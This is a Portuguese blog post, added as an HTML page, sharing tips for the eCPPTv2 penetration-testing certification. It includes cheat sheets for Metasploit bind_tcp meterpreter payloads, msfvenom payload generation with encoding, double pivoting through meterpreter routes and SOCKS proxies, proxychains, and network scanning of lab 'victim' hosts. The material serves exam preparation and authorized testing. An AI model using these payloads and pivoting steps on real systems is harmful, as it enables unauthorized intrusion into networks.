@@ -1,0 +1,213 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>eCPPTv2 - aprendizados - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     ECPPTV2 - APRENDIZADOS
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : eCPPTv2 - aprendizados
+        autor  : offensive think
+        data   : Mon, May 29, 2023
+        tags   : certifications
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/ecpptv2.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+0 - INTRO
+1 - SOBRE A CERTIFICAÇÃO
+2 - MINHAS RECOMENDAÇÕES
+3 - CHEAT SHEETS
+4 - METERPRETERS
+5 - PIVOTING
+6 - Powershell e Comandos Windows
+7 - OUTROS CHEATSHEETS
+8 - OUTROS LINKS INTERESSANTES
+
+
+</pre>
+<a href="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12fe89dd-2d16-4737-9613-76f91c829901%2FUntitled.png?width=384&amp;table=block&amp;id=9154a50b-9a53-400f-b17a-8445f344566d" target="_blank"><img src="https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F12fe89dd-2d16-4737-9613-76f91c829901%2FUntitled.png?width=384&amp;table=block&amp;id=9154a50b-9a53-400f-b17a-8445f344566d"  ></a>
+<pre>
+
+
+---[ 0x00 - INTRO ]-----------------------------------------------------
+Desta vez vou escrever um pouco sobre minha experiência com esta certificação pois fiquei pensando que alguns pontos podem vir a ajudar outros que estejam no mesmo caminho.
+Muitas postagens são no sentido de detalhar o dia a dia da prova, o que usou para estudo, como é a prova, etc. Entendo que estes ajudam também, mas essa não é minha intenção, mas sim, relatar algumas experiências de forma direta que podem ajudar a quem está buscando esta certificação.
+
+
+---[ 0x01 - SOBRE A CERTIFICAÇÃO ]--------------------------------------
+Hoje eu possuo certificações da EC COUNCIL (CEH v10 ANSI e PRACTICAL) , da Offensive Security ( OSCE ) e da eLearn ( eWPT e agora eCPPTv2 ).
+Gosto bastante das certificações da eLearn por elas serem mais próximas de um trabalho real de um pentest do que um CTF/Desafio onde se busca provar que conseguiu determinado objetivo através de flags.
+Nas certificações da eLearn que fiz até agora a pressão está, não em atingir um objetivo em tanto tempo , como as da Offensive Security, mas sim em não saber onde termina. Você tem 7 dias para fazer a prova mas em nenhum momento é dito quantas vulnerabilidades você achará pelo caminho, logo, tem que enumerar e testar tudo. Afinal, é um pentest onde você foi pago para reportar as vulnerabilidades presentes!
+Um dos pontos que não gostei é que, em uma prova que exige explorar várias máquinas, em caso de instabilidade de um serviço de uma máquina, ter que reiniciar todo o lab e consequentemente todas as máquinas e ter que explorar tudo de novo, é bem chato.
+
+
+---[ 0x02 - MINHAS RECOMENDAÇÕES ]--------------------------------------
+- Experiências pessoais, são experiências pessoais. Sempre bom lembrar que as experiências de cada um tem influência direta no quanto e como cada um estudou para obter a certificação.  Leve isso em conta.  Pense se você tem domínio ou não sobre os assuntos cobrados na certificação.
+- Ao conectar no LAB da prova você deverá baixar um arquivo .ovpn de conexão de VPN. A VPN está configurada para usar a cifra AES-128-CBC e o arquivo está ainda no padrão antigo do openvpn. Abra o arquivo, e substitua cipher AES-128-CBC por data-ciphers AES-128-CBC.
+- *&gt;&gt;&gt;* *DOCUMENTE seu passo a passo!* *&lt;&lt;&lt;* Faça um passo a passo de todos os comandos usados para comprometer uma máquina e depois escalar privilégios. Caso você precise começar do zero (reiniciar seu kali, reiniciar o metasploit, resetar o lab) você voltará ao estado atual rapidamente.
+Exemplo de exploração, criação de rota para outra rede através da sessão do meterpreter e definição de um socks proxy , no metasploit:
+
+    use exploit/multi/handler
+    set payload linux/x86/meterpreter/bind_tcp
+    set LPORT 1337
+    set RHOST 1.1.1.1
+    exploit
+    background
+    route add 2.2.2.2/24 1
+    use auxiliary/server/socks_proxy
+    set VERSION 4a
+    set SRVHOST 127.0.0.1
+    set SRVPORT 1080
+    exploit -j
+
+- Se prepare. É de comum conhecimento que você enfrentará um desafio de Buffer Overflow. Não é nada de outro mundo, mas não custa se preparar pra verificar se o conhecimento está “embaixo das pontas dos dedos”. Baixe e configure uma VM windows 7 com o Immunity Debugger, python 2.7 e o módulo mona.py. Baixe e configure uma VM com o kali e todas as ferramentas que você pensa em utilizar. Verifique se tem integração de COPIAR e COLAR , pastas compartilhas, etc. entre elas e o seu host para facilitar a troca de arquivos e conteúdos.Para as máquinas virtuais eu usei o Vagrant (https://www.vagrantup.com/). Aconselho a dar uma olhada pois facilita muito a instalação do ambiente.Kali : box kalilinux/rollingWindows 7: box datacastle/windows7
+- Leve em consideração que a prova é antiga, isso não quer dizer que não aborde temas atuais, mas que as vezes podem haver incompatibilidades de ferramentas. Por exemplo, existem alguns relatos de problemas encontrados onde a pessoa resolveu fazendo downgrade para o Metasploit 5. O script pimpmykali ( ‣ ) fazia downgrade mas depois das últimas atualizações não faz mais. Uma possibilidade, seria instalar uma VM do kali linux antiga que tivesse o Metasploit 5. Eu utilizei o metasploit 6 com o kali mais atual, no momento da escrita deste artigo, kali 2023.2, e tudo funcionou corretamente. Um detalhe importante: No Metasploit 5 o módulo para criar um server socks 4 é o auxiliary/server/socks4aNo Metasploit 6 o módulo para criar um server socks 4 é o auxiliary/server/socks_proxy onde você deve definir a opção SET VERSION 4a.
+- Diferentemente das provas da Offensive, o metasploit/meterpreter são seus amigos. Dá pra fazer quase tudo apenas com eles. ;D
+- Você precisará usar pivoteamento, isso também já é de conhecimento público. Basta o metasploit. O artigo https://pentest.blog/explore-hidden-networks-with-double-pivoting/ é bem interessante. Em resumo. Com o metasploit você consegue, usando o meterpreter, criar rotas e proxies para outras redes. O passo a passo a ser seguido de forma geral é:A- Comprometa a máquina B - Crie uma rota para a rede que você deseja usando a sessão meterpreter como pivotC - Suba um Socks Proxy local para, usando o proxychains, poder usar outras ferramentas (nmap, nc, etc.) que não estão no metasploit.
+- Lembre-se , pivotear exige que toda a comunicação seja possível. Sessões meterpreter utilizadas no roteamento podem cair ou estarem “apenas parecendo ok” e fazer a comunicação falharA conexão VPN pode ficar instável Usar o Three-way-handshake (-sT no nmap) quando tiver escaneando através de Pivots.
+- Se a conexão a um host está falhando, se o que estava funcionando não funciona mais, as vezes não é necessário resetar o LAB. Observe se a VPN está ativa. Observe se os túneis (rotas e socks proxy) estão ativos. Tente antes sair e abrir de novo o Metasploit.
+- Ao explorar um serviço e ele cair, se ele estiver gerando outros processos e thread, pode ser que ele “se recupere”. Aguarde e teste de novo. Talvez você não precise reiniciar o lab.
+- *Lembre-se, a prova tenta simular um ambiente corporativo real! *Existe firewall habilitado na máquina ? Você está tentando conectar em porta que deveria estar aberta e não consegue ? Firewall ? Todos os elementos que fecham a rota até o destino estão estáveis ? Lembre-se! Um shell reverso só é possível se o destino consegue conectar em sua máquina!  Consegue ?
+
+
+---[ 0x03 - CHEAT SHEETS ]----------------------------------------------
+Algumas anotações de comandos que fiz para ter acesso rápido e alguns links de cheat sheets que achei interessante e podem ajudar.
+
+
+---[ 0x04 - METERPRETERS ]----------------------------------------------
+
+    kali&gt; msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=1337 -f elf &gt; meterpreter_bind_1337
+    kali&gt; msfvenom -p windows/meterpreter/bind_tcp LPORT=1337 -a x86 -e x86/shikata_ga_nai EXITFUNC=process --platform  windows -b &quot;\x00&quot; -f python
+
+
+
+---[ 0x05 - PIVOTING ]--------------------------------------------------
+
+:: metasploit
+
+Observe o prompt! Os comandos são executados no prompt do metasploit e não no meterpreter!
+Exemplo geral:
+
+    meterpreter&gt; background
+    msf&gt; route add &lt;NETWORK&gt;/&lt;MASK&gt; &lt;SESSION ID&gt;
+    msf&gt; use auxiliary/server/socks_proxy
+    msf&gt; set VERSION 4a
+    msf&gt; set SRVHOST 127.0.0.1
+    msf&gt; set LPORT 1080
+    msf&gt; exploit -j
+
+Exemplo prático para duplo pivoteamento.
+
+    KALI MACHINE VPN ADDRESS: 192.168.0.2
+    VITIMA 1: 10.10.10.1
+    VITIMA 2: 10.150.15.1 (acessível apenas através da VITIMA 1)
+    VITIMA 3: 10.250.25.1 (acessivel apenas através da VITIMA 2)
+    
+    ... EXPLORAR A VITIMA 1 ...
+    msf&gt; use exploit/windows/...
+    msf&gt; set payload windows/meterpreter/bind_tcp
+    msf&gt; set RHOSTS 10.10.10.1
+    msf&gt; set LPORT  1337 
+    msf&gt; exploit
+    
+    ... CRIAR ROTA E SOCKS PARA A REDE DA VITIMA 2...
+    meterpreter&gt; background
+    msf&gt; route add 10.150.15.0/24 1
+    msf&gt; use auxiliary/server/socks_proxy
+    msf&gt; set VERSION 4a
+    msf&gt; set SRVHOST 127.0.0.1
+    msf&gt; set LPORT 1080
+    msf&gt; exploit -j
+    
+    ... EXPLORAR A VITIMA 2 ... 
+    ... É possível pois o metasploit usará automaticamente o pivot da vitima 1...
+    msf&gt; use exploit/windows/...
+    msf&gt; set payload windows/meterpreter/bind_tcp
+    msf&gt; set RHOSTS 10.150.15.1
+    msf&gt; set LPORT  21337 
+    msf&gt; exploit
+    
+    ... CRIAR ROTA E SOCKS PARA A REDE DA VITIMA 3...
+    meterpreter&gt; background
+    msf&gt; route add 10.250.25.0/24 2
+    msf&gt; use auxiliary/server/socks_proxy
+    msf&gt; set VERSION 4a
+    msf&gt; set SRVHOST 127.0.0.1
+    msf&gt; set LPORT 1081        #(atentar para a mudança da porta)
+    msf&gt; exploit -j
+    
+    ... No linux usando o nmap para escanear a vitima 3...
+    root# proxychains nmap -sT -Pn -n 10.250.25.1
+
+
+:: proxychains
+
+Alterar o arquivo /etc/proxychains4.conf:
+- substituir strict chain por dynamic chain (isso é para usar mais de um proxy para duplo pivoteamento)
+- Adicionar para cada Socks Proxy criado socks4 127.0.0.1 &lt;PORTA&gt;
+Exemplo do arquivo de configuração
+
+    dynamic chain
+    socks4 127.0.0.1 1080
+    socks4 127.0.0.1 1081
+
+Usando o proxychains com o nmap
+root&gt; proxychain nmap -sT -Pn -n 10.10.10.10
+
+
+---[ 0x06 - POWERSHELL E COMANDOS WINDOWS ]-----------------------------
+
+    #PORTAS ABERTAS
+    netstat -tupan
+    
+    #HABILITAR TELNET NO WINDOWS 7
+    pkgmgr /iu:”TelnetClient”
+    
+    #PING SWEEP WINDOWS
+    for /L %i in (1,1,255) do @ping -n 1 -w 200 10.10.10.%i &gt; nul &amp;&amp; echo 10.10.10.%i is up.
+
+
+
+---[ 0x07 - OUTROS CHEATSHEETS ]----------------------------------------
+- https://github.com/c0ffee0vrflw/eCPPTNotes
+- https://github.com/sergiovks/eCPPTv2-Personal-Cheatsheet-ESP-
+- https://github.com/PopLabSec/eCPPTv2-Notes-AIO
+
+
+---[ 0x08 - OUTROS LINKS INTERESSANTES ]--------------------------------
+https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
+https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/
+https://pentest.blog/explore-hidden-networks-with-double-pivoting/
+https://www.hdysec.com/double-pivoting-both-metasploit-and-manual/
+https://github.com/spencerdodd/kernelpop
+https://notchxor.github.io/oscp-notes/8-cheatsheets/msfvenom/
+https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/
+https://github.com/Arvanaghi/SessionGopher
+https://www.sans.org/blog/offensive-powershell-metasploit-meterpreter/
+https://github.com/cris-m/Buffer-Overflow-Exploit-Development/blob/main/assets/documentations/fuzzing.md
+https://github.com/F-Masood/Exploiting_StackBased_BufferOverflows
+https://securitytutorials.co.uk/scanning-and-port-forwarding-through-a-meterpreter-session/
+https://www.secjuice.com/windows-post-exploitation-enabling-rdp/
+https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
+https://www.jamescarroll.me/blog/pivoting-with-meterpreter-and-proxychains
+https://www.hackplayers.com/2018/04/taller-de-pivoting-metasploit.html
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
